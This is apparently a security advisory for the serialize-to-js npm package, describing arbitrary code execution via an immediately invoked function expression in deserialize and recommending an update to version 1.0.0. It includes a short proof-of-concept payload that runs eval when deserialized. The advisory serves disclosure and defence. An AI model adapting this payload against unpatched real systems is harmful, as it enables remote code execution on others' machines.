summary: "Code Execution Through IIFE in serialize-to-js\nAffected versions of `serialize-to-js`\
  \ may be vulnerable to arbitrary code execution through an Immediately Invoked Function Expression\
  \ (IIFE). \n\n## Proof of Concept\n```js\nvar payload = \"{e: (function(){ eval('console.log(`exploited`)')\
  \ })() }\"\nvar serialize = require('serialize-to-js');\nserialize.deserialize(payload);\n\
  ```\n\n\n## Recommendation\n\nUpdate to version 1.0.0, or later, and review [this disclaimer](https://www.npmjs.com/package/serialize-to-js#deserialize)\
  \ from the author."
